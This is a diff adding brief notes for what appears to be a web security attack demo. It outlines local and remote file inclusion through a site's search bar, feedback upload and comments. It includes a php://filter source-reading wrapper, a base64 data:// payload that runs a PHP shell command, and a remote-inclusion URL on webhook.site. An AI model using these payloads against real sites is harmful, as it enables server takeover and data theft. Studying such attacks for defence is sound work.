@@ -1,0 +1,20 @@
+ATTACK DEMO:
+1- Local file inclusion
+ -path traversal attack
+   in the search bar (/etc/passwd)
+ -utilizing search bar vulnerability
+   including arbitrary files stored in local server
+ -utilizing feedback upload vulnerability
+   uploading a malicious file then executing it from the search bar
+ -php filter
+  php://filter/convert.base64-encode/resource=[home.php]
+   to read the content of php files to identify sensitive information(maybe the db configration file info?)
+ -php data     data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4g&cmd=ls
+ can execute command or even javascript files!
+
+
+2- Remote file inclusion (https://webhook.site/#!/a5d5db17-7e23-414d-b2ad-ca240ab2360e)
+ -utilizing feedback comment vulnerability
+  adding website url in the comments so that other users execute it when browsing the comments
+-utilizing search bar vulnerability
+ including website url in the search bar
